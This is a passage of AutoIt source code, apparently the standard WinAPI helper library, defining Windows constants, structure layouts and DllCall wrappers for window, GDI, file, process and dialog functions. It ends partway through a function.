Global Const $lr_defaultcolor = 0
Global Const $lr_monochrome = 1
Global Const $lr_color = 2
Global Const $lr_copyreturnorg = 4
Global Const $lr_copydeleteorg = 8
Global Const $lr_loadfromfile = 16
Global Const $lr_loadtransparent = 32
Global Const $lr_defaultsize = 64
Global Const $lr_vgacolor = 128
Global Const $lr_loadmap3dcolors = 4096
Global Const $lr_createdibsection = 8192
Global Const $lr_copyfromresource = 16384
Global Const $lr_shared = 32768
Global Const $obm_trtype = 32732
Global Const $obm_lfarrowi = 32734
Global Const $obm_rgarrowi = 32735
Global Const $obm_dnarrowi = 32736
Global Const $obm_uparrowi = 32737
Global Const $obm_combo = 32738
Global Const $obm_mnarrow = 32739
Global Const $obm_lfarrowd = 32740
Global Const $obm_rgarrowd = 32741
Global Const $obm_dnarrowd = 32742
Global Const $obm_uparrowd = 32743
Global Const $obm_restored = 32744
Global Const $obm_zoomd = 32745
Global Const $obm_reduced = 32746
Global Const $obm_restore = 32747
Global Const $obm_zoom = 32748
Global Const $obm_reduce = 32749
Global Const $obm_lfarrow = 32750
Global Const $obm_rgarrow = 32751
Global Const $obm_dnarrow = 32752
Global Const $obm_uparrow = 32753
Global Const $obm_close = 32754
Global Const $obm_old_restore = 32755
Global Const $obm_old_zoom = 32756
Global Const $obm_old_reduce = 32757
Global Const $obm_btncorners = 32758
Global Const $obm_checkboxes = 32759
Global Const $obm_check = 32760
Global Const $obm_btsize = 32761
Global Const $obm_old_lfarrow = 32762
Global Const $obm_old_rgarrow = 32763
Global Const $obm_old_dnarrow = 32764
Global Const $obm_old_uparrow = 32765
Global Const $obm_size = 32766
Global Const $obm_old_close = 32767
Global Const $oic_sample = 32512
Global Const $oic_hand = 32513
Global Const $oic_ques = 32514
Global Const $oic_bang = 32515
Global Const $oic_note = 32516
Global Const $oic_winlogo = 32517
Global Const $oic_warning = $oic_bang
Global Const $oic_error = $oic_hand
Global Const $oic_information = $oic_note
Global $__g_ainprocess_winapi[64][2] = [[0, 0]]
Global $__g_awinlist_winapi[64][2] = [[0, 0]]
Global Const $__winapiconstant_wm_setfont = 48
Global Const $__winapiconstant_fw_normal = 400
Global Const $__winapiconstant_default_charset = 1
Global Const $__winapiconstant_out_default_precis = 0
Global Const $__winapiconstant_clip_default_precis = 0
Global Const $__winapiconstant_default_quality = 0
Global Const $__winapiconstant_logpixelsx = 88
Global Const $__winapiconstant_logpixelsy = 90
Global Const $tagcursorinfo = "dword Size;dword Flags;handle hCursor;" & $tagpoint
Global Const $tagdisplay_device = "dword Size;wchar Name[32];wchar String[128];dword Flags;wchar ID[128];wchar Key[128]"
Global Const $tagflashwinfo = "uint Size;hwnd hWnd;dword Flags;uint Count;dword TimeOut"
Global Const $tagiconinfo = "bool Icon;dword XHotSpot;dword YHotSpot;handle hMask;handle hColor"
Global Const $tagmemorystatusex = "dword Length;dword MemoryLoad;" & "uint64 TotalPhys;uint64 AvailPhys;uint64 TotalPageFile;uint64 AvailPageFile;" & "uint64 TotalVirtual;uint64 AvailVirtual;uint64 AvailExtendedVirtual"

Func _winapi_attachconsole($ipid = -1)
	Local $aresult = DllCall("kernel32.dll", "bool", "AttachConsole", "dword", $ipid)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_attachthreadinput($iattach, $iattachto, $battach)
	Local $aresult = DllCall("user32.dll", "bool", "AttachThreadInput", "dword", $iattach, "dword", $iattachto, "bool", $battach)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_beep($ifreq = 500, $iduration = 1000)
	Local $aresult = DllCall("kernel32.dll", "bool", "Beep", "dword", $ifreq, "dword", $iduration)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_bitblt($hdestdc, $ixdest, $iydest, $iwidth, $iheight, $hsrcdc, $ixsrc, $iysrc, $irop)
	Local $aresult = DllCall("gdi32.dll", "bool", "BitBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidth, "int", $iheight, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "dword", $irop)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_callnexthookex($hhk, $icode, $wparam, $lparam)
	Local $aresult = DllCall("user32.dll", "lresult", "CallNextHookEx", "handle", $hhk, "int", $icode, "wparam", $wparam, "lparam", $lparam)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc

Func _winapi_callwindowproc($pprevwndfunc, $hwnd, $imsg, $wparam, $lparam)
	Local $aresult = DllCall("user32.dll", "lresult", "CallWindowProc", "ptr", $pprevwndfunc, "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc

Func _winapi_clienttoscreen($hwnd, ByRef $tpoint)
	Local $aret = DllCall("user32.dll", "bool", "ClientToScreen", "hwnd", $hwnd, "struct*", $tpoint)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Return $tpoint
EndFunc

Func _winapi_closehandle($hobject)
	Local $aresult = DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hobject)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_combinergn($hrgndest, $hrgnsrc1, $hrgnsrc2, $icombinemode)
	Local $aresult = DllCall("gdi32.dll", "int", "CombineRgn", "handle", $hrgndest, "handle", $hrgnsrc1, "handle", $hrgnsrc2, "int", $icombinemode)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_commdlgextendederror()
	Local Const $cderr_dialogfailure = 65535
	Local Const $cderr_findresfailure = 6
	Local Const $cderr_initialization = 2
	Local Const $cderr_loadresfailure = 7
	Local Const $cderr_loadstrfailure = 5
	Local Const $cderr_lockresfailure = 8
	Local Const $cderr_memallocfailure = 9
	Local Const $cderr_memlockfailure = 10
	Local Const $cderr_nohinstance = 4
	Local Const $cderr_nohook = 11
	Local Const $cderr_notemplate = 3
	Local Const $cderr_registermsgfail = 12
	Local Const $cderr_structsize = 1
	Local Const $fnerr_buffertoosmall = 12291
	Local Const $fnerr_invalidfilename = 12290
	Local Const $fnerr_subclassfailure = 12289
	Local $aresult = DllCall("comdlg32.dll", "dword", "CommDlgExtendedError")
	If NOT @error Then
		Switch $aresult[0]
			Case $cderr_dialogfailure
				Return SetError($aresult[0], 0, "The dialog box could not be created." & @LF & "The common dialog box function's call to the DialogBox function failed." & @LF & "For example, this error occurs if the common dialog box call specifies an invalid window handle.")
			Case $cderr_findresfailure
				Return SetError($aresult[0], 0, "The common dialog box function failed to find a specified resource.")
			Case $cderr_initialization
				Return SetError($aresult[0], 0, "The common dialog box function failed during initialization." & @LF & "This error often occurs when sufficient memory is not available.")
			Case $cderr_loadresfailure
				Return SetError($aresult[0], 0, "The common dialog box function failed to load a specified resource.")
			Case $cderr_loadstrfailure
				Return SetError($aresult[0], 0, "The common dialog box function failed to load a specified string.")
			Case $cderr_lockresfailure
				Return SetError($aresult[0], 0, "The common dialog box function failed to lock a specified resource.")
			Case $cderr_memallocfailure
				Return SetError($aresult[0], 0, "The common dialog box function was unable to allocate memory for internal structures.")
			Case $cderr_memlockfailure
				Return SetError($aresult[0], 0, "The common dialog box function was unable to lock the memory associated with a handle.")
			Case $cderr_nohinstance
				Return SetError($aresult[0], 0, "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a corresponding instance handle.")
			Case $cderr_nohook
				Return SetError($aresult[0], 0, "The ENABLEHOOK flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a pointer to a corresponding hook procedure.")
			Case $cderr_notemplate
				Return SetError($aresult[0], 0, "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box," & @LF & "but you failed to provide a corresponding template.")
			Case $cderr_registermsgfail
				Return SetError($aresult[0], 0, "The RegisterWindowMessage function returned an error code when it was called by the common dialog box function.")
			Case $cderr_structsize
				Return SetError($aresult[0], 0, "The lStructSize member of the initialization structure for the corresponding common dialog box is invalid")
			Case $fnerr_buffertoosmall
				Return SetError($aresult[0], 0, "The buffer pointed to by the lpstrFile member of the OPENFILENAME structure is too small for the file name specified by the user." & @LF & "The first two bytes of the lpstrFile buffer contain an integer value specifying the size, in TCHARs, required to receive the full name.")
			Case $fnerr_invalidfilename
				Return SetError($aresult[0], 0, "A file name is invalid.")
			Case $fnerr_subclassfailure
				Return SetError($aresult[0], 0, "An attempt to subclass a list box failed because sufficient memory was not available.")
		EndSwitch
	EndIf
	Return SetError(@error, @extended, "0x" & Hex($aresult[0]))
EndFunc

Func _winapi_copyicon($hicon)
	Local $aresult = DllCall("user32.dll", "handle", "CopyIcon", "handle", $hicon)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createbitmap($iwidth, $iheight, $iplanes = 1, $ibitsperpel = 1, $pbits = 0)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateBitmap", "int", $iwidth, "int", $iheight, "uint", $iplanes, "uint", $ibitsperpel, "ptr", $pbits)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createcompatiblebitmap($hdc, $iwidth, $iheight)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createcompatibledc($hdc)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createevent($pattributes = 0, $bmanualreset = True, $binitialstate = True, $sname = "")
	Local $snametype = "wstr"
	If $sname = "" Then
		$sname = 0
		$snametype = "ptr"
	EndIf
	Local $aresult = DllCall("kernel32.dll", "handle", "CreateEventW", "ptr", $pattributes, "bool", $bmanualreset, "bool", $binitialstate, $snametype, $sname)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createfile($sfilename, $icreation, $iaccess = 4, $ishare = 0, $iattributes = 0, $psecurity = 0)
	Local $ida = 0, $ism = 0, $icd = 0, $ifa = 0
	If BitAND($iaccess, 1) <> 0 Then $ida = BitOR($ida, $generic_execute)
	If BitAND($iaccess, 2) <> 0 Then $ida = BitOR($ida, $generic_read)
	If BitAND($iaccess, 4) <> 0 Then $ida = BitOR($ida, $generic_write)
	If BitAND($ishare, 1) <> 0 Then $ism = BitOR($ism, $file_share_delete)
	If BitAND($ishare, 2) <> 0 Then $ism = BitOR($ism, $file_share_read)
	If BitAND($ishare, 4) <> 0 Then $ism = BitOR($ism, $file_share_write)
	Switch $icreation
		Case 0
			$icd = $create_new
		Case 1
			$icd = $create_always
		Case 2
			$icd = $open_existing
		Case 3
			$icd = $open_always
		Case 4
			$icd = $truncate_existing
	EndSwitch
	If BitAND($iattributes, 1) <> 0 Then $ifa = BitOR($ifa, $file_attribute_archive)
	If BitAND($iattributes, 2) <> 0 Then $ifa = BitOR($ifa, $file_attribute_hidden)
	If BitAND($iattributes, 4) <> 0 Then $ifa = BitOR($ifa, $file_attribute_readonly)
	If BitAND($iattributes, 8) <> 0 Then $ifa = BitOR($ifa, $file_attribute_system)
	Local $aresult = DllCall("kernel32.dll", "handle", "CreateFileW", "wstr", $sfilename, "dword", $ida, "dword", $ism, "ptr", $psecurity, "dword", $icd, "dword", $ifa, "ptr", 0)
	If @error OR ($aresult[0] = $invalid_handle_value) Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createfont($iheight, $iwidth, $iescape = 0, $iorientn = 0, $iweight = $__winapiconstant_fw_normal, $bitalic = False, $bunderline = False, $bstrikeout = False, $icharset = $__winapiconstant_default_charset, $ioutputprec = $__winapiconstant_out_default_precis, $iclipprec = $__winapiconstant_clip_default_precis, $iquality = $__winapiconstant_default_quality, $ipitch = 0, $sface = "Arial")
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateFontW", "int", $iheight, "int", $iwidth, "int", $iescape, "int", $iorientn, "int", $iweight, "dword", $bitalic, "dword", $bunderline, "dword", $bstrikeout, "dword", $icharset, "dword", $ioutputprec, "dword", $iclipprec, "dword", $iquality, "dword", $ipitch, "wstr", $sface)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createfontindirect($tlogfont)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateFontIndirectW", "struct*", $tlogfont)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createpen($ipenstyle, $iwidth, $ncolor)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreatePen", "int", $ipenstyle, "int", $iwidth, "INT", $ncolor)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createprocess($sappname, $scommand, $psecurity, $pthread, $binherit, $iflags, $penviron, $sdir, $pstartupinfo, $pprocess)
	Local $tcommand = 0
	Local $sappnametype = "wstr", $sdirtype = "wstr"
	If $sappname = "" Then
		$sappnametype = "ptr"
		$sappname = 0
	EndIf
	If $scommand <> "" Then
		$tcommand = DllStructCreate("wchar Text[" & 260 + 1 & "]")
		DllStructSetData($tcommand, "Text", $scommand)
	EndIf
	If $sdir = "" Then
		$sdirtype = "ptr"
		$sdir = 0
	EndIf
	Local $aresult = DllCall("kernel32.dll", "bool", "CreateProcessW", $sappnametype, $sappname, "struct*", $tcommand, "ptr", $psecurity, "ptr", $pthread, "bool", $binherit, "dword", $iflags, "ptr", $penviron, $sdirtype, $sdir, "ptr", $pstartupinfo, "ptr", $pprocess)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_createrectrgn($ileftrect, $itoprect, $irightrect, $ibottomrect)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createroundrectrgn($ileftrect, $itoprect, $irightrect, $ibottomrect, $iwidthellipse, $iheightellipse)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateRoundRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect, "int", $iwidthellipse, "int", $iheightellipse)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createsolidbitmap($hwnd, $icolor, $iwidth, $iheight, $brgb = 1)
	Local $hdc = _winapi_getdc($hwnd)
	Local $hdestdc = _winapi_createcompatibledc($hdc)
	Local $hbitmap = _winapi_createcompatiblebitmap($hdc, $iwidth, $iheight)
	Local $hold = _winapi_selectobject($hdestdc, $hbitmap)
	Local $trect = DllStructCreate($tagrect)
	DllStructSetData($trect, 1, 0)
	DllStructSetData($trect, 2, 0)
	DllStructSetData($trect, 3, $iwidth)
	DllStructSetData($trect, 4, $iheight)
	If $brgb Then
		$icolor = BitOR(BitAND($icolor, 65280), BitShift(BitAND($icolor, 255), -16), BitShift(BitAND($icolor, 16711680), 16))
	EndIf
	Local $hbrush = _winapi_createsolidbrush($icolor)
	If NOT _winapi_fillrect($hdestdc, $trect, $hbrush) Then
		_winapi_deleteobject($hbitmap)
		$hbitmap = 0
	EndIf
	_winapi_deleteobject($hbrush)
	_winapi_releasedc($hwnd, $hdc)
	_winapi_selectobject($hdestdc, $hold)
	_winapi_deletedc($hdestdc)
	If NOT $hbitmap Then Return SetError(1, 0, 0)
	Return $hbitmap
EndFunc

Func _winapi_createsolidbrush($ncolor)
	Local $aresult = DllCall("gdi32.dll", "handle", "CreateSolidBrush", "INT", $ncolor)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_createwindowex($iexstyle, $sclass, $sname, $istyle, $ix, $iy, $iwidth, $iheight, $hparent, $hmenu = 0, $hinstance = 0, $pparam = 0)
	If $hinstance = 0 Then $hinstance = _winapi_getmodulehandle("")
	Local $aresult = DllCall("user32.dll", "hwnd", "CreateWindowExW", "dword", $iexstyle, "wstr", $sclass, "wstr", $sname, "dword", $istyle, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "hwnd", $hparent, "handle", $hmenu, "handle", $hinstance, "ptr", $pparam)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_defwindowproc($hwnd, $imsg, $iwparam, $ilparam)
	Local $aresult = DllCall("user32.dll", "lresult", "DefWindowProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $iwparam, "lparam", $ilparam)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_deletedc($hdc)
	Local $aresult = DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hdc)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_deleteobject($hobject)
	Local $aresult = DllCall("gdi32.dll", "bool", "DeleteObject", "handle", $hobject)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_destroyicon($hicon)
	Local $aresult = DllCall("user32.dll", "bool", "DestroyIcon", "handle", $hicon)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_destroywindow($hwnd)
	Local $aresult = DllCall("user32.dll", "bool", "DestroyWindow", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_drawedge($hdc, $prect, $iedgetype, $iflags)
	Local $aresult = DllCall("user32.dll", "bool", "DrawEdge", "handle", $hdc, "ptr", $prect, "uint", $iedgetype, "uint", $iflags)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_drawframecontrol($hdc, $prect, $itype, $istate)
	Local $aresult = DllCall("user32.dll", "bool", "DrawFrameControl", "handle", $hdc, "ptr", $prect, "uint", $itype, "uint", $istate)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_drawicon($hdc, $ix, $iy, $hicon)
	Local $aresult = DllCall("user32.dll", "bool", "DrawIcon", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_drawiconex($hdc, $ix, $iy, $hicon, $iwidth = 0, $iheight = 0, $istep = 0, $hbrush = 0, $iflags = 3)
	Local $ioptions
	Switch $iflags
		Case 1
			$ioptions = $di_mask
		Case 2
			$ioptions = $di_image
		Case 3
			$ioptions = $di_normal
		Case 4
			$ioptions = $di_compat
		Case 5
			$ioptions = $di_defaultsize
		Case Else
			$ioptions = $di_nomirror
	EndSwitch
	Local $aresult = DllCall("user32.dll", "bool", "DrawIconEx", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon, "int", $iwidth, "int", $iheight, "uint", $istep, "handle", $hbrush, "uint", $ioptions)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_drawline($hdc, $ix1, $iy1, $ix2, $iy2)
	_winapi_moveto($hdc, $ix1, $iy1)
	If @error Then Return SetError(@error, @extended, False)
	_winapi_lineto($hdc, $ix2, $iy2)
	If @error Then Return SetError(@error + 10, @extended, False)
	Return True
EndFunc

Func _winapi_drawtext($hdc, $stext, ByRef $trect, $iflags)
	Local $aresult = DllCall("user32.dll", "int", "DrawTextW", "handle", $hdc, "wstr", $stext, "int", -1, "struct*", $trect, "uint", $iflags)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_duplicatehandle($hsourceprocesshandle, $hsourcehandle, $htargetprocesshandle, $idesiredaccess, $binherithandle, $ioptions)
	Local $aresult = DllCall("kernel32.dll", "bool", "DuplicateHandle", "handle", $hsourceprocesshandle, "handle", $hsourcehandle, "handle", $htargetprocesshandle, "handle*", 0, "dword", $idesiredaccess, "bool", $binherithandle, "dword", $ioptions)
	If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, 0)
	Return $aresult[4]
EndFunc

Func _winapi_enablewindow($hwnd, $benable = True)
	Local $aresult = DllCall("user32.dll", "bool", "EnableWindow", "hwnd", $hwnd, "bool", $benable)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_enumdisplaydevices($sdevice, $idevnum)
	Local $tname = 0, $iflags = 0, $adevice[5]
	If $sdevice <> "" Then
		$tname = DllStructCreate("wchar Text[" & StringLen($sdevice) + 1 & "]")
		DllStructSetData($tname, "Text", $sdevice)
	EndIf
	Local $tdevice = DllStructCreate($tagdisplay_device)
	Local $idevice = DllStructGetSize($tdevice)
	DllStructSetData($tdevice, "Size", $idevice)
	Local $aret = DllCall("user32.dll", "bool", "EnumDisplayDevicesW", "struct*", $tname, "dword", $idevnum, "struct*", $tdevice, "dword", 1)
	If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
	Local $in = DllStructGetData($tdevice, "Flags")
	If BitAND($in, $display_device_attached_to_desktop) <> 0 Then $iflags = BitOR($iflags, 1)
	If BitAND($in, $display_device_primary_device) <> 0 Then $iflags = BitOR($iflags, 2)
	If BitAND($in, $display_device_mirroring_driver) <> 0 Then $iflags = BitOR($iflags, 4)
	If BitAND($in, $display_device_vga_compatible) <> 0 Then $iflags = BitOR($iflags, 8)
	If BitAND($in, $display_device_removable) <> 0 Then $iflags = BitOR($iflags, 16)
	If BitAND($in, $display_device_modespruned) <> 0 Then $iflags = BitOR($iflags, 32)
	$adevice[0] = True
	$adevice[1] = DllStructGetData($tdevice, "Name")
	$adevice[2] = DllStructGetData($tdevice, "String")
	$adevice[3] = $iflags
	$adevice[4] = DllStructGetData($tdevice, "ID")
	Return $adevice
EndFunc

Func _winapi_enumwindows($bvisible = True, $hwnd = Default)
	__winapi_enumwindowsinit()
	If $hwnd = Default Then $hwnd = _winapi_getdesktopwindow()
	__winapi_enumwindowschild($hwnd, $bvisible)
	Return $__g_awinlist_winapi
EndFunc

Func __winapi_enumwindowsadd($hwnd, $sclass = "")
	If $sclass = "" Then $sclass = _winapi_getclassname($hwnd)
	$__g_awinlist_winapi[0][0] += 1
	Local $icount = $__g_awinlist_winapi[0][0]
	If $icount >= $__g_awinlist_winapi[0][1] Then
		ReDim $__g_awinlist_winapi[$icount + 64][2]
		$__g_awinlist_winapi[0][1] += 64
	EndIf
	$__g_awinlist_winapi[$icount][0] = $hwnd
	$__g_awinlist_winapi[$icount][1] = $sclass
EndFunc

Func __winapi_enumwindowschild($hwnd, $bvisible = True)
	$hwnd = _winapi_getwindow($hwnd, $gw_child)
	While $hwnd <> 0
		If (NOT $bvisible) OR _winapi_iswindowvisible($hwnd) Then
			__winapi_enumwindowsadd($hwnd)
			__winapi_enumwindowschild($hwnd, $bvisible)
		EndIf
		$hwnd = _winapi_getwindow($hwnd, $gw_hwndnext)
	WEnd
EndFunc

Func __winapi_enumwindowsinit()
	ReDim $__g_awinlist_winapi[64][2]
	$__g_awinlist_winapi[0][0] = 0
	$__g_awinlist_winapi[0][1] = 64
EndFunc

Func _winapi_enumwindowspopup()
	__winapi_enumwindowsinit()
	Local $hwnd = _winapi_getwindow(_winapi_getdesktopwindow(), $gw_child)
	Local $sclass
	While $hwnd <> 0
		If _winapi_iswindowvisible($hwnd) Then
			$sclass = _winapi_getclassname($hwnd)
			If $sclass = "#32768" Then
				__winapi_enumwindowsadd($hwnd)
			ElseIf $sclass = "ToolbarWindow32" Then
				__winapi_enumwindowsadd($hwnd)
			ElseIf $sclass = "ToolTips_Class32" Then
				__winapi_enumwindowsadd($hwnd)
			ElseIf $sclass = "BaseBar" Then
				__winapi_enumwindowschild($hwnd)
			EndIf
		EndIf
		$hwnd = _winapi_getwindow($hwnd, $gw_hwndnext)
	WEnd
	Return $__g_awinlist_winapi
EndFunc

Func _winapi_enumwindowstop()
	__winapi_enumwindowsinit()
	Local $hwnd = _winapi_getwindow(_winapi_getdesktopwindow(), $gw_child)
	While $hwnd <> 0
		If _winapi_iswindowvisible($hwnd) Then __winapi_enumwindowsadd($hwnd)
		$hwnd = _winapi_getwindow($hwnd, $gw_hwndnext)
	WEnd
	Return $__g_awinlist_winapi
EndFunc

Func _winapi_expandenvironmentstrings($sstring)
	Local $aresult = DllCall("kernel32.dll", "dword", "ExpandEnvironmentStringsW", "wstr", $sstring, "wstr", "", "dword", 4096)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, "")
	Return $aresult[2]
EndFunc

Func _winapi_extracticonex($sfile, $iindex, $plarge, $psmall, $iicons)
	Local $aresult = DllCall("shell32.dll", "uint", "ExtractIconExW", "wstr", $sfile, "int", $iindex, "struct*", $plarge, "struct*", $psmall, "uint", $iicons)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_fatalappexit($smessage)
	DllCall("kernel32.dll", "none", "FatalAppExitW", "uint", 0, "wstr", $smessage)
	If @error Then Return SetError(@error, @extended)
EndFunc

Func _winapi_fillrect($hdc, $prect, $hbrush)
	Local $aresult
	If IsPtr($hbrush) Then
		$aresult = DllCall("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $prect, "handle", $hbrush)
	Else
		$aresult = DllCall("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $prect, "dword_ptr", $hbrush)
	EndIf
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_findexecutable($sfilename, $sdirectory = "")
	Local $aresult = DllCall("shell32.dll", "INT", "FindExecutableW", "wstr", $sfilename, "wstr", $sdirectory, "wstr", "")
	If @error Then Return SetError(@error, @extended, "")
	If $aresult[0] <= 32 Then Return SetError(10, $aresult[0], "")
	Return SetExtended($aresult[0], $aresult[3])
EndFunc

Func _winapi_findwindow($sclassname, $swindowname)
	Local $aresult = DllCall("user32.dll", "hwnd", "FindWindowW", "wstr", $sclassname, "wstr", $swindowname)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_flashwindow($hwnd, $binvert = True)
	Local $aresult = DllCall("user32.dll", "bool", "FlashWindow", "hwnd", $hwnd, "bool", $binvert)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_flashwindowex($hwnd, $iflags = 3, $icount = 3, $itimeout = 0)
	Local $tflash = DllStructCreate($tagflashwinfo)
	Local $iflash = DllStructGetSize($tflash)
	Local $imode = 0
	If BitAND($iflags, 1) <> 0 Then $imode = BitOR($imode, $flashw_caption)
	If BitAND($iflags, 2) <> 0 Then $imode = BitOR($imode, $flashw_tray)
	If BitAND($iflags, 4) <> 0 Then $imode = BitOR($imode, $flashw_timer)
	If BitAND($iflags, 8) <> 0 Then $imode = BitOR($imode, $flashw_timernofg)
	DllStructSetData($tflash, "Size", $iflash)
	DllStructSetData($tflash, "hWnd", $hwnd)
	DllStructSetData($tflash, "Flags", $imode)
	DllStructSetData($tflash, "Count", $icount)
	DllStructSetData($tflash, "Timeout", $itimeout)
	Local $aresult = DllCall("user32.dll", "bool", "FlashWindowEx", "struct*", $tflash)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_floattoint($nfloat)
	Local $tfloat = DllStructCreate("float")
	Local $tint = DllStructCreate("int", DllStructGetPtr($tfloat))
	DllStructSetData($tfloat, 1, $nfloat)
	Return DllStructGetData($tint, 1)
EndFunc

Func _winapi_flushfilebuffers($hfile)
	Local $aresult = DllCall("kernel32.dll", "bool", "FlushFileBuffers", "handle", $hfile)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_formatmessage($iflags, $psource, $imessageid, $ilanguageid, ByRef $pbuffer, $isize, $varguments)
	Local $sbuffertype = "struct*"
	If IsString($pbuffer) Then $sbuffertype = "wstr"
	Local $aresult = DllCall("Kernel32.dll", "dword", "FormatMessageW", "dword", $iflags, "ptr", $psource, "dword", $imessageid, "dword", $ilanguageid, $sbuffertype, $pbuffer, "dword", $isize, "ptr", $varguments)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, 0)
	If $sbuffertype = "wstr" Then $pbuffer = $aresult[5]
	Return $aresult[0]
EndFunc

Func _winapi_framerect($hdc, $prect, $hbrush)
	Local $aresult = DllCall("user32.dll", "int", "FrameRect", "handle", $hdc, "ptr", $prect, "handle", $hbrush)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_freelibrary($hmodule)
	Local $aresult = DllCall("kernel32.dll", "bool", "FreeLibrary", "handle", $hmodule)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_getancestor($hwnd, $iflags = 1)
	Local $aresult = DllCall("user32.dll", "hwnd", "GetAncestor", "hwnd", $hwnd, "uint", $iflags)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getasynckeystate($ikey)
	Local $aresult = DllCall("user32.dll", "short", "GetAsyncKeyState", "int", $ikey)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getbkmode($hdc)
	Local $aresult = DllCall("gdi32.dll", "int", "GetBkMode", "handle", $hdc)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _winapi_getclassname($hwnd)
	If NOT IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
